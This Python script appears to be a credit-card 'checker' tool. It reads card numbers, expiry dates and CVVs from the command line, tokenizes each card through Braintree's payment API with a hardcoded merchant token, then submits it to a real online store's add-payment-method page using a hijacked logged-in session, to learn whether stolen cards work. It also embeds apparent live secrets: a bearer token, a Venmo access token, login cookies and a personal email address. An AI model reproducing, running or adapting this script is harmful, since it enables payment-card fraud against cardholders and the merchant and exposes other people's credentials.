import requests
import json
import sys
import signal

# prevent BrokenPipeError when run via API
signal.signal(signal.SIGPIPE, signal.SIG_DFL)

# ===== API-safe input =====
if len(sys.argv) < 2 or not sys.argv[1].strip():
    print("error: no input provided")
    sys.exit(0)

cc_input = sys.argv[1].strip()
# =========================
cc_parts = cc_input.split("|")

if len(cc_parts) < 4:
    print("error: invalid input format")
    sys.exit(0)

# keep YOUR variable names
cc_number = cc_parts[0]
exp_month = cc_parts[1]
exp_year  = cc_parts[2]
cvv       = cc_parts[3]
if len(exp_year) == 2:
    exp_year = "20" + exp_year

headers = {
    'accept': '*/*',
    'accept-language': 'en-US',
    'authorization': 'Bearer eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3Njc4NjU4NTksImp0aSI6Ijc0OGUxN2ViLTcxY2QtNDMwMi04MTQ4LTI2ZWYyNjljMTBlNyIsInN1YiI6ImRxaDVueHZud3ZtMnFxamgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImRxaDVueHZud3ZtMnFxamgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyJdLCJvcHRpb25zIjp7Im1lcmNoYW50X2FjY291bnRfaWQiOiJiZXN0b3BwcmVtaXVtYWNjZXNzb3JpZXNncm91cF9pbnN0YW50IiwicGF5cGFsX2NsaWVudF9pZCI6IkFhbmJtNXpHVC1DTWtSNUFKS0o5UjBMa3RQcWxYSW96RENDNTNMQ2EyM3NBVXd0akRBandHM3BsVG1HNy1EanRSM2NGdXZwNEpKLUZ3VjVlIn19.pVzjSrmJDQbMFb6SaAnc1Y_zZesmz1w-aIzYf6TLEhigd5Pu6ucK6zTvhiZZKV_Vjd9OD0fiPi4VZiTm5OqBmg',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'priority': 'u=1, i',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
}

json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'efe093c5-1bbc-4d3a-abad-ea544a481b48',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': cc_number,
                'expirationMonth': exp_month,
                'expirationYear': exp_year,
                'cvv': cvv,
                'billingAddress': {
                    'postalCode': '10080',
                    'streetAddress': '',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

try:
    payment_response = response.json()
except:
    payment_response = {}

if 'data' in payment_response and 'tokenizeCreditCard' in payment_response['data'] and 'token' in payment_response['data']['tokenizeCreditCard']:
    token = payment_response['data']['tokenizeCreditCard']['token']
    
    cookies = {
        'ccid.90027420': '350117451.7147232711',
        '_ga': 'GA1.1.345755347.1767509458',
        '_fbp': 'fb.1.1767509459128.661670686296154976',
        '__attentive_id': 'e5234fb7978a446ba3834f701d00cf28',
        '_attn_': 'eyJ1Ijoie1wiY29cIjoxNzY3NTA5NDU5MjkzLFwidW9cIjoxNzY3NTA5NDU5MjkzLFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcImU1MjM0ZmI3OTc4YTQ0NmJhMzgzNGY3MDFkMDBjZjI4XCJ9In0=',
        '__attentive_cco': '1767509459309',
        'checkout_continuity_service': 'a9b21a0a-3c49-4fc1-a82d-f9e1eaf826ea',
        'attntv_mstore_email': 'sonmd708@gmail.com:0',
        '_gcl_au': '1.1.896870353.1767509446.43753646.1767509470.1767509523',
        'wordpress_logged_in_9a06d022e5a0d800df86e500459c6102': 'John%20Bowers%7C1768719125%7CVKfRS8dhZm3nTPtOxrTTBCp2tfOgk5sOlQSV41IW4OV%7C907bc31dd1c8d96962a405dd8f088622b0404ee14a4ce69679a61e5cd65d7fc7',
        '__kla_id': 'eyJjaWQiOiJObUkyWTJJMVpUZ3RZelpqTVMwMFl6SXdMVGcxT0RRdFlqTTJaRFU1WmpObFltUm0iLCIkZXhjaGFuZ2VfaWQiOiIxYUVYWWtJVkpJS3JRRDFQZmxLQ2xpc3lseVhEZWhUN0hzWlA4RGRQNFQ0Lkt4ZFJHViJ9',
        '__attentive_dv': '1',
        'wcacr_user_country': 'IN',
        'wfwaf-authcookie-0cfc0dfc6182cc86058203ff9ed084fe': '1184928%7Cother%7Cread%7Cb9b9c513f99a648cafc904bee22ec2752bd0149a9e9a2c62258f3bdd12242969',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2026-01-07%2009%3A19%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.calipercovers.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_first_add': 'fd%3D2026-01-07%2009%3A19%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.calipercovers.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Mobile%20Safari%2F537.36',
        'cf_clearance': 'fxABA6wS.EEK4ky6zsg9fNUNf2I6pUt679rbQQNyPZw-1767779378-1.2.1.1-hK8UTotvaPFdpSXblwCkeG1ng0V5gKPVaAN9biLxtHHzPcd1ri_0OAwU8lGKTMgxWaxK67nkfQiNodOF15wzMU.i5eiJSSuIZzjGYM1o036XOygsHF6sgVV0PEOnm3x6qiagj773YxnEgbGJOTDVtCT_GbEPYkeHrgRTZ6FK3Zn.gKApY7yvGDbOOGFm14aQmoN3NgGSlAijRhr5OzxAMe9dHW7MShw0zpplXsRkAUg',
        'yotpo_pixel': 'ce6de5e2-caa3-4450-bff7-257f72f71c29',
        '_sp_ses.d8f1': '*',
        '__attentive_session_id': 'a1ac50cb4e8949e4bef0be750fba4ada',
        '__attentive_ss_referrer': 'https://www.calipercovers.com/my-account/add-payment-method/',
        'rl_visitor_history': 'f59c25c5-5c62-458a-b79c-c11c1d4e64d8',
        'sifi_user_id': 'undefined',
        'sbjs_session': 'pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.calipercovers.com%2Fmy-account%2Fadd-payment-method%2F',
        '_sp_id.d8f1': '8cb3f7b750b013b1.1767509460.9.1767779463.1767726717',
        '__attentive_pv': '4',
        '_uetsid': 'd1206c80ea3711f0af35cde0a57fdf83',
        '_uetvid': 'bb620e20e93911f0952d09c34c7d805d',
        '_ga_9VQF57TW94': 'GS2.1.s1767779411$o9$g1$t1767779502$j60$l0$h0',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.calipercovers.com',
        'priority': 'u=0, i',
        'referer': 'https://www.calipercovers.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
    }

    data = {
        'payment_method': 'braintree_cc',
        'braintree_cc_nonce_key': token,
        'braintree_cc_device_data': '{"device_session_id":"16a1b2d9d15fdbf42aabf349deea1b06","fraud_merchant_id":null,"correlation_id":"efe093c5-1bbc-4d3a-abad-ea544a48"}',
        'braintree_cc_3ds_nonce_key': '',
        'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/dqh5nxvnwvm2qqjh/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/dqh5nxvnwvm2qqjh"},"merchantId":"dqh5nxvnwvm2qqjh","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Bestop Premium Accessories Group","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NjgwMzg2MTYsImp0aSI6IjZiYzY0OTc3LTlmOGYtNDE1Ny04MTNiLTNhMWExMmI4MTE1ZSIsInN1YiI6ImRxaDVueHZud3ZtMnFxamgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImRxaDVueHZud3ZtMnFxamgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSJdLCJvcHRpb25zIjp7fX0.7t6KBhziuZn2M5XuDZ8hXn1UFtoH6yRTdADAwCdj0-mJVDRWAyKfbu6BeEAfikpPoArPzqDwNRLEaSYPJ_AtxQ","paypalClientId":"Aanbm5zGT-CMkR5AJKJ9R0LktPqlXIozDCC53LCa23sAUwtjDAjwG3plTmG7-DjtR3cFuvp4JJ-FwV5e","supportedNetworks":["visa","mastercard","amex","discover"]},"payWithVenmo":{"merchantId":"4042552878213091679","accessToken":"access_token$production$dqh5nxvnwvm2qqjh$d9918bec102e9ab038971ac225e91fc1","environment":"production","enrichedCustomerDataEnabled":true},"paypalEnabled":true,"paypal":{"displayName":"Bestop Premium Accessories Group","clientId":"Aanbm5zGT-CMkR5AJKJ9R0LktPqlXIozDCC53LCa23sAUwtjDAjwG3plTmG7-DjtR3cFuvp4JJ-FwV5e","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"bestoppremiumaccessoriesgroup_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
        'woocommerce-add-payment-method-nonce': '2d24bcc24c',
        '_wp_http_referer': '/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1',
    }

    response2 = requests.post(
        'https://www.calipercovers.com/my-account/add-payment-method/',
        cookies=cookies,
        headers=headers,
        data=data,
    )
    print('{"status": "success", "message": "Payment method added"}')
else:
    print(json.dumps(payment_response))
